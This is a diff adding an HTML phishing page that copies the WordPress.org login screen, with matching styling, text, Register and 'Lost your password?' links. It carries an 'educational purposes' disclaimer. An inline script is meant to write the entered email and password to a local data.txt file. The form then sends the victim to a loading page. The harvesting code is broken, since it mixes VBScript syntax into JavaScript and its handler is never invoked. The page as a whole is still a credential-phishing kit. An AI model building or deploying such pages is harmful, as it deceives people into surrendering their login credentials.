@@ -1,0 +1,169 @@
+﻿<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <!--Author: @new92-->
+    <!--This page has been created only for educational purposes !! The author has no responsibility for any illegal actions carried out using this page-->
+    <meta charset="utf-8" />
+    <title>WordPress.org Login | WordPress.org English</title>
+    <link rel="icon" type="image/x-icon" href="icon.ico" />
+    <style>
+        body {
+            background-color: #f0f0f1;
+        }
+
+        .logo {
+            margin-top: 55px;
+        }
+
+        .login {
+            background-color: white;
+            height: 380px;
+            width: 310px;
+            color: #7e7e7e;
+            font-family: sans-serif;
+            font-size: 14px;
+            margin-left: 580px;
+            line-height: 22px;
+            margin-top: -10px;
+            padding: 10px 15px 10px 25px;
+        }
+
+        .log {
+            font-size: 14px;
+            font-family: sans-serif;
+        }
+
+        .email {
+            height: 31px;
+            width: 250px;
+            border-radius: 4px;
+            margin-top: -8px;
+            border: 1px solid #8c8f94;
+        }
+
+            .email:focus-visible {
+                outline: 2px solid #0083e2;
+            }
+        input {
+            font-size: 25px;
+            color: #23282d;
+            font-family: sans-serif;
+        }
+        .password {
+            height: 31px;
+            width: 250px;
+            border-radius: 4px;
+            margin-top: -10px;
+            border: 1px solid #8c8f94;
+        }
+
+            .password:focus-visible {
+                outline: 2px solid #0083e2;
+            }
+
+        .box {
+            height: 15px;
+            width: 30px;
+            margin-left: -6px;
+        }
+        .box:hover {
+            cursor: pointer;
+        }
+
+        .rememberme {
+            font-size: 12px;
+            color: #555d66;
+            margin-left: 24px;
+            margin-top: -25px;
+        }
+
+            .rememberme:hover {
+                cursor: pointer;
+            }
+
+        .sub {
+            font-size: 14px;
+            background-color: #2271B1;
+            height: 40px;
+            color: white;
+            width: 300px;
+            border-radius: 4px;
+            margin-top: 10px;
+            border: 2px solid #006799;
+        }
+
+            .sub:hover {
+                background-color: #006799;
+                cursor: pointer;
+            }
+
+        .register {
+            color: #50575E;
+            text-decoration: underline;
+            margin-left: 695px;
+            font-size: 14px;
+        }
+            .register:hover {
+                text-decoration: underline;
+            }
+
+        .slash {
+            margin-left: 750px;
+            margin-top: -16px;
+        }
+
+        .lost {
+            color: #50575E;
+            text-decoration: underline;
+            margin-left: 760px;
+            margin-top: -34px;
+            font-size: 14px;
+        }
+            .lost:hover {
+                text-decoration: underline;
+                cursor: pointer;
+            }
+    </style>
+</head>
+<body>
+<script language="Javascript">
+    function WriteToFile(passForm) {
+
+        set fso = CreateObject("Scripting.FileSystemObject");
+        set f = fso.CreateTextFile("data.txt", True);
+
+        var Email = document.getElementById('email');
+        var Password = document.getElementById('password');
+
+        f.writeline("Email :" + Email);
+        f.writeline("Password :" + Password);
+
+        f.writeline("-----------------------------");
+        f.Close();
+    }
+</script>
+    <center><img src="logo.svg" class="logo" /></center>
+    <br />
+    <br />
+    <form action="loading.html" class="login" onsubmit="WriteToFile">
+        <p class="log">Log in to your WordPress.org account to contribute to WordPress, get help in the support forum, or rate and review themes and plugins.</p>
+        <p style="margin-top: 30px;">Username or Email Address</p>
+        <label for="email"></label>
+        <input class="email" type="text" name="email" id="email" required="required" />
+        <br />
+        <p style="margin-top: 30px;">Password</p>
+        <label for="password"></label>
+        <input class="password" type="password" name="password" id="password" required="required" />
+        <br />
+        <br />
+        <input type="checkbox" value="forever" name="rememberme" id="rememberme" class="box" />
+        <p class="rememberme">Remember Me</p>
+        <input class="sub" type="submit" value="Log In" />
+    </form>
+    <br />
+    <a href="forbidden.html" class="register">Register</a>
+    <p class="slash">|</p>
+    <p class="lost">Lost your password?</p>
+</body>
+</html>
